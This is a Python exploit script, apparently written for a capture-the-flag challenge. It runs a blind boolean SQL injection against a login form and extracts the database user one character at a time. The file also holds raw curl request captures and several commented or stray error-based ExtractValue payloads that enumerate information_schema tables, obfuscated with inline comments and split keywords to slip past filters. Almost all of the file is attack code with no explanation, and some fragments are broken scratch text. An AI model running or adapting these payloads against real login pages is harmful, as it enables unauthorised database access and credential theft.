import requests
import string

url = "https://sqli.chal.h4ck3r.quest/login"
# curl 'http://splitline.tw:5000/public_api' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://splitline.tw:5000/' -H 'Content-type: application/json' -H 'Origin: http://splitline.tw:5000' -H 'Connection: keep-alive' --data-raw '{"text":"%2e%2e/looksLikeFlag?flag=FLAG{"}'
# curl 'https://sqli.chal.h4ck3r.quest/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://sqli.chal.h4ck3r.quest' -H 'Connection: keep-alive' -H 'Referer: https://sqli.chal.h4ck3r.quest/' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'username=%5C%27%2F**%2F%7C%7C%2F**%2Fascii%28mid%28user%28%29%2C1%2C1%29%29+%3E+80%2F**%2F%23&password='
# curl 'https://sqli.chal.h4ck3r.quest/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-User: ?1' -H 'Cache-Control: max-age=0'
# curl 'https://sqli.chal.h4ck3r.quest/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://sqli.chal.h4ck3r.quest/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://sqli.chal.h4ck3r.quest' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -H 'Cache-Control: max-age=0' --data-raw 'username=%5C%27%2F**%2F%7C%7C%2F**%2Fascii%28mid%28user%28%29%2C1%2C1%29%29+%3E+114%2F**%2F%23&password='
# my_data = "{\"text\":\"%2e%2e/looksLikeFlag?flag=FLAG{"
# username=%5C%27%2F**%2F%7C%7C%2F**%2Fascii%28mid%28user%28%29%2C1%2C1%29%29%3E90%2F**%2F%23&password=
my_data = "username=%5C%27%2F**%2F%7C%7C%2F**%2Fascii%28mid%28user%28%29%2C"
mid = "%2C1%29%29%3E"
last = "%2F**%2F%23&password="
my_header = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://sqli.chal.h4ck3r.quest/', 
            'Content-type': 'application/x-www-form-urlencoded',
            'Origin': 'https://sqli.chal.h4ck3r.quest',
            'Connection': 'keep-alive'}

# resp = requests.post(url, headers=my_header, data=data) data = 傳進網頁的資料
for j in range(1,21):
    j = str(j)
    for i in list(string.ascii_uppercase):
        w = str(ord(i))
        data = my_data+ j + mid + w + last
        resp = requests.post(url, data=data)
        # print(resp.text)
        if(resp.text.find('Incorrect username or password.') >= 0):
            print(i)
            break
    for i in list(string.ascii_lowercase):
        w = str(ord(i))
        data = my_data+ j + mid + w + last
        resp = requests.post(url, data=data)
        if(resp.text.find('Incorrect username or password.') >= 0):
            print(i)
            break
    
    #     if(resp.text.find('Welcome!') >= 0):
    # for w in list(string.ascii_lowercase):
    #     data = my_data + w + last
    #     resp = requests.post(url, headers=my_header, data=data)
    #     if(resp.text.find('Welcome!') >= 0):
    #         my_data = my_data + w
    #         break
    # if(resp.text.find('false') >= 0):
    #     for w in range(10):
    #         a = str(w)
    #         data = my_data + a + last
    #         resp = requests.post(url, headers=my_header, data=data)
    #         if(resp.text.find('true') >= 0):
    #             my_data = my_data + a
    #             break
    # if(resp.text.find('false') >= 0):
    #     w = '_'
    #     data = my_data + w + last
    #     resp = requests.post(url, headers=my_header, data=data)
    #     if(resp.text.find('true') >= 0):
    #         my_data = my_data + w
    # if(resp.text.find('false') >= 0):
    #     w = '}'
    #     data = my_data + w + last
    #     resp = requests.post(url, headers=my_header, data=data)
    #     if(resp.text.find('true') >= 0):
    #         my_data = my_data + w
    #         break

print(my_data)
# \'/**/||/**/length(database()) > 0/**/#
# "\\'/**/||/**/select/**/ExtractValue(1,/**/concat(0x0A,SEL/**/ECT/**/table_name/**/FROM/**/information_schema.tables/**/whe re/**/STRCMP(table_schema,schema()));/**/#"
# print(resp.status_code)
# \\'/**/||/**/select/**/ExtractValue(1,/**/concat(0x0A,version());/**/#
# root@192.168.1


\'/**/||/**/selec t/**/ExtractValue(0x0a,concat(0x0a,(sel ect/**/table_name/**/from/**/info rmation_schema.tables/**/wh ere/**/table_schema),0x3d,(database())))/**/#

# curl 'https://sqli.chal.h4ck3r.quest/login' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://sqli.chal.h4ck3r.quest/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://sqli.chal.h4ck3r.quest' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -H 'Cache-Control: max-age=0' --data-raw 'username=%5C%27%2F**%2F%7C%7C%2F**%2Fascii%28mid%28user%28%29%2C1%2C1%29%29+%3E+114%2F**%2F%23&password='


\'O R/**/ExtractValue(1,concat(0x7e,(s elect/**/*/**/FROM/**/info rmation_schema.tables/**/W HERE/**/table_schema),0x3d,0x22,(db),0x22,0x7e))#

\'O R/**/ExtractValue(1,concat(0x7e,(s elect/**/*/**/FROM/**/info rmation_schema.tables/**/W HERE/**/table_schema),0x3d,database(),0x7e))#
